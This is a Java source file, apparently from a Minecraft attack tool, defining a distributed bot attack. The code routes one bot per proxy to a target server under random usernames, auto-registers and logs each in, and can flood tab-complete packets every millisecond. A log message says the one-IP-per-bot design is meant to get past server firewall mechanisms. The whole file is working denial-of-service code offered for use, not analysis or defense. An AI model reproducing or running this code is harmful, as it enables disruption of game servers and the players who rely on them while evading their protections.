package me.alikomi.endminecraft.tasks.attack;

import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.List;
import java.util.Map;
import java.util.Random;

public class DistributedBotAttack extends Util {

    private static String ip;
    private static int port;
    private static int time;
    private static int maxAttack;
    private static int sleepTime;
    private static Map<Proxy.Type,String> ips;
    private static boolean enableTab;


    public DistributedBotAttack(String ip, int port, int time, int maxAttack, int sleepTime, Map<Proxy.Type,String> ips, boolean enableTab) {
        this.ip = ip;
        this.port = port;
        this.time = time;
        this.maxAttack = maxAttack;
        this.sleepTime = sleepTime;
        this.ips = ips;
        this.enableTab = enableTab;
    }

    public boolean startAttack() {

        if (maxAttack > ips.size()) {
            log("请提供代理数大于最大连接数，出于绕过服务器防火墙机制，1个ip只连接一个");
            log("当前代理数：" + ips.size());
            return false;
        }

        ips.forEach((type,ip) -> {


            new Thread(() -> {

                String pip = ip.split(":")[0];
                int pport = Integer.parseInt(ip.split(":")[1]);
                Proxy proxy = new Proxy(type,new InetSocketAddress(pip,pport));
                MinecraftProtocol protocol = new MinecraftProtocol(getRandomString(new Random().nextInt(8)%(8-4+1) + 4));
                Client mc = new Client(ip,port,protocol,new TcpSessionFactory(proxy));
                mc.getSession().addListener(new SessionListener() {
                    @Override
                    public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                        if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {

                            mc.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));
                            mc.getSession().send(new ClientChatPacket("/login qwnmopzx123"));

                            if (enableTab) {
                                new Thread(() -> {
                                    while (mc.getSession().isConnected()) {
                                        mc.getSession().send(new ClientTabCompletePacket("/"));
                                        try {
                                            Thread.sleep(1);
                                        } catch (InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                    }
                                }).start();

                            }

                        }
                    }

                    @Override
                    public void packetSent(PacketSentEvent packetSentEvent) {

                    }

                    @Override
                    public void connected(ConnectedEvent connectedEvent) {

                    }

                    @Override
                    public void disconnecting(DisconnectingEvent disconnectingEvent) {

                    }

                    @Override
                    public void disconnected(DisconnectedEvent disconnectedEvent) {
                        log("断开连接：" +disconnectedEvent.getReason());
                        //mc.getSession().connect();
                    }
                });
                mc.getSession().connect();
            }).start();

        });

        try {
            Thread.sleep(sleepTime);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return true;

    }
    public static String getRandomString(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; ++i) {
            int number = random.nextInt(62);// [0,62)
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
}
